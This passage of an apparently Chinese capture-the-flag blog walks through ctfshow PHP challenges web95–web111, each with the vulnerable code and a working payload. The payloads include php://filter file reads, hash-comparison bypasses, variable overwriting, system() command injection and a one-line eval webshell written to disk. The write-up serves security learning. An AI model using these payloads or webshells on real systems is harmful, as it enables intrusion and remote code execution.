class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">"0"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了点号，依旧有办法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">num=%<span class="number">20010574</span></span><br><span class="line">%<span class="number">20</span>空格占去头个字符，依旧可以用进制绕过</span><br></pre></td></tr></table></figure><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'u'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'u'</span>]==<span class="string">'flag.php'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file($_GET[<span class="string">'u'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不能匹配到flag.php，用伪协议绕过读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">u=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'a'</span>] != $_POST[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MD5强比较，数组绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:<span class="string">'flag'</span>;</span><br><span class="line">$_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>?$_GET=&amp;$_COOKIE:<span class="string">'flag'</span>;</span><br><span class="line">$_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>?$_GET=&amp;$_SERVER:<span class="string">'flag'</span>;</span><br><span class="line">highlight_file($_GET[<span class="string">'HTTP_FLAG'</span>]==<span class="string">'flag'</span>?$flag:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>考察三目运算符以及地址引用传值</p><p>这里要求传给<code>HTTP_FLAG</code>的值为flag</p><p>只要通过GET传递的参数都会被POST传递的覆盖</p><p>也就是说不仅仅要GET传值给<code>HTTP_FLAG</code>,同时用POST传递相同的值</p><p>方便理解，改一下形式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>($_GET)&#123;</span><br><span class="line">$_GET=&amp;$_POST;<span class="comment">//GET传值都会被POST覆盖</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">'flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>)&#123;</span><br><span class="line">$_GET=&amp;$_COOKIE;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">'flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>]==<span class="string">'flag'</span>)&#123;</span><br><span class="line">$_GET=&amp;$_SERVER;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">'flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'HTTP_FLAG'</span>]==<span class="string">'flag'</span>)&#123;</span><br><span class="line">highlight_file($_GET[<span class="string">'HTTP_FLAG'</span>]==<span class="string">'flag'</span>);<span class="comment">//获取flag的条件</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:HTTP_FLAG=flag</span><br><span class="line">POST:HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><p>学习到了新东西，快乐了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$allow = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">36</span>; $i &lt; <span class="number">0x36d</span>; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(<span class="number">1</span>,$i));<span class="comment">//写入数组</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'n'</span>]) &amp;&amp; in_array($_GET[<span class="string">'n'</span>], $allow))&#123;</span><br><span class="line">    <span class="comment">//in_array函数漏洞，当第三个参数未设置时，会把文件名后缀去除，也是就保留前面部分</span></span><br><span class="line">    file_put_contents($_GET[<span class="string">'n'</span>], $_POST[<span class="string">'content'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组里被压入了一些数字，必须保证传入的n包含数字才能够写入文件</p><p>开始以为是只要包含数字就可以，其实不然，分析放在上面了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:n=<span class="number">13.</span>php</span><br><span class="line">POST:content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>之后选择蚁剑连接或是直接读取都可</p><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;/"</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/\;/"</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"$v2('ctfshow')$v3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要满足v1是数字即可，还必须包括分号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span>&amp;v3=;system(<span class="string">'ls'</span>);;</span><br></pre></td></tr></table></figure><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">'v1'</span>];</span><br><span class="line">$v2=$_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3=$_GET[<span class="string">'v3'</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"$v2('ctfshow')$v3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用函数打印对象里面的属性，这里有一个Reflectionclass</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">通过ReflectionClass，我们可以得到Person类的以下信息：</span><br><span class="line"><span class="number">1.</span>常量 Contants</span><br><span class="line"><span class="number">2.</span>属性 Property Names</span><br><span class="line"><span class="number">3.</span>方法 Method Names静态</span><br><span class="line"><span class="number">4.</span>属性 <span class="keyword">Static</span> Properties</span><br><span class="line"><span class="number">5.</span>命名空间 <span class="keyword">Namespace</span></span><br><span class="line">6.Person类是否为final或者abstract</span><br><span class="line"><span class="number">7.</span>Person类是否有某个方法</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与web103相同，直接看103的分析</p><h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);<span class="comment">//is_numeric函数判断是否为数值，并进行与运算</span></span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);<span class="comment">//截取第二个字符之后所有的内容</span></span><br><span class="line">    $str = call_user_func($v1,$s);<span class="comment">//调用函数</span></span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/.*p.*h.*p.*/i"</span>,$str))&#123;<span class="comment">//过滤php后缀名</span></span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sorry'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个注意点，就是在php7中</p><img src="/2020/09/25/PHPcharacter/1.png" class=""><p>所以这里不能用16进制绕过了</p><p>这道题看的出题人的payload，小小疑问，太需要运气了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:v2=<span class="number">225044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=g.php</span></span><br><span class="line">POST:v1=hex2bin</span><br><span class="line"></span><br><span class="line"><span class="comment">//详细说说</span></span><br><span class="line"><span class="comment">//v2是先经过base64再hex加密的shell，原型是<span class="meta">&lt;?</span>=`cat *`;</span></span><br><span class="line"><span class="comment">//说要运气是v2中刚好只有一个e，就是科学计数法，也就是数值了</span></span><br><span class="line"><span class="comment">//v3用伪协议</span></span><br><span class="line"><span class="comment">//v1的hex2bin是为了将16进制转化回ascii字符，前面的22是加的，绕过substr的截断</span></span><br></pre></td></tr></table></figure><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//没get到考点，应该是出题人可能少打了个‘=’，传一样的值就行</span></span><br></pre></td></tr></table></figure><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$error=<span class="string">'你还想要flag嘛？'</span>;</span><br><span class="line">$suces=<span class="string">'既然你想要那给你吧！'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key===<span class="string">'error'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"what are you doing?!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($value===<span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"what are you doing?!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'flag'</span>]==$flag))&#123;</span><br><span class="line">    <span class="keyword">die</span>($error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"your are good"</span>.$flag.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($suces);</span><br></pre></td></tr></table></figure><p>经典变量覆盖，开始没找到点，后来出题师傅说要用<code>die($error)</code>,这就懂了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">POST：error=$flag&amp;flag=$$flag</span><br><span class="line">GET：$flag=flag</span><br><span class="line">分析：</span><br><span class="line">post：</span><br><span class="line">error=$flag=&gt;$error=$$flag</span><br><span class="line">要让$error=$flag拿到flag，这一步的前提是$_POST[<span class="string">'flag'</span>]!=$flag</span><br><span class="line">get:</span><br><span class="line">$flag=flag=&gt;$$flag=$flag</span><br><span class="line">post:</span><br><span class="line">flag=$$flag</span><br></pre></td></tr></table></figure><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组绕过即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:v2[]=<span class="number">2</span></span><br><span class="line">POST:v1[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">       parse_str($v1,$v2);</span><br><span class="line">       <span class="keyword">if</span>($v2[<span class="string">'flag'</span>]==md5($v3))&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parse_str()</code>变量覆盖，MD5相等只需要找到加密后以<code>0e</code>开头，纯数字的即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">GET:v3&#x3D;240610708</span><br><span class="line">POST:v1&#x3D;flag&#x3D;0e1</span><br></pre></td></tr></table></figure><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z]+$"</span>, $_GET[<span class="string">'c'</span>])===<span class="keyword">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev($_GET[<span class="string">'c'</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能出现字母，并且字符串倒序取整的值，<code>%00</code>截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">c&#x3D;a%00778</span><br></pre></td></tr></table></figure><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]+/'</span>, $v1) &amp;&amp; preg_match(<span class="string">'/[a-zA-Z]+/'</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"echo new $v1($v2());"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>用到了异常类，看到格式想着是类，但是没有想到抛出异常类，问了羽师傅，拿到了payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="number">1.</span>v1=<span class="keyword">Exception</span>;system(<span class="string">"cat%20fl36dg.txt"</span>);<span class="comment">//&amp;v2=a</span></span><br><span class="line"><span class="number">2.</span>v1=<span class="keyword">Exception</span>;<span class="comment">//&amp;v2=system("cat%20fl36dg.txt");</span></span><br></pre></td></tr></table></figure><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"echo new $v1($v2());"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;phpff.com&#x2F;filesystemiterator</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;class.filesystemiterator.php</span><br></pre></td></tr></table></figure><p>利用filesystemiterator类带出指定目录下的所有文件</p><p><code>getcwd</code>，查看当前路径下的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">(&amp;$v1,&amp;$v2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"$$v1 = &amp;$$v2;"</span>);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span 